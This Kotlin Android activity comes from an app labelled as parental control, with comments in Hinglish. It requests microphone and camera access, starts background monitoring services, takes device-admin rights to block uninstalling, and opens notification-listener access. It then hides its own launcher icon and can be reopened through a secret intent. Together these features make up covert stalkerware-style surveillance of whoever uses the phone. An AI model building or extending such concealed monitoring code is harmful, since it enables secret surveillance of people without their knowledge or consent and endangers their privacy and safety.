package com.parentcontrol.app

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val PERMISSION_CODE = 101
    private val ADMIN_REQUEST_CODE = 102
    lateinit var dpm: DevicePolicyManager
    lateinit var adminComponent: ComponentName

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, AdminReceiver::class.java)

        val statusText = findViewById<TextView>(R.id.statusText)
        val btnActivate = findViewById<Button>(R.id.btnActivate)

        // Secret open se aaya hai toh seedha monitoring shuru
        if (intent.getBooleanExtra("secret_open", false)) {
            statusText.text = "✅ Monitoring Active"
        }

        btnActivate.setOnClickListener {
            if (checkPermissions()) {
                startMonitoringService()
                startVolumeService()
                activateDeviceAdmin()
                checkNotificationPermission()
                hideAppIcon()
                statusText.text = "✅ Monitoring Active — Icon Hidden"
            } else {
                requestPermissions()
            }
        }
    }

    private fun hideAppIcon() {
        val pm = packageManager
        val componentName = ComponentName(this, MainActivity::class.java)
        pm.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    private fun startVolumeService() {
        val intent = Intent(this, VolumeService::class.java)
        startForegroundService(intent)
    }

    private fun checkNotificationPermission() {
        val enabledListeners = Settings.Secure.getString(
            contentResolver, "enabled_notification_listeners"
        )
        val componentName = ComponentName(this, NotificationListener::class.java).flattenToString()
        if (enabledListeners == null || !enabledListeners.contains(componentName)) {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }
    }

    private fun activateDeviceAdmin() {
        if (!dpm.isAdminActive(adminComponent)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Uninstall protection ke liye required hai")
            }
            startActivityForResult(intent, ADMIN_REQUEST_CODE)
        }
    }

    private fun checkPermissions(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED &&
               ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestPermissions() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CAMERA,
                Manifest.permission.POST_NOTIFICATIONS
            ),
            PERMISSION_CODE
        )
    }

    private fun startMonitoringService() {
        startForegroundService(Intent(this, MonitoringService::class.java))
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_CODE && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
            startMonitoringService()
            startVolumeService()
            activateDeviceAdmin()
            checkNotificationPermission()
            hideAppIcon()
        }
    }
}
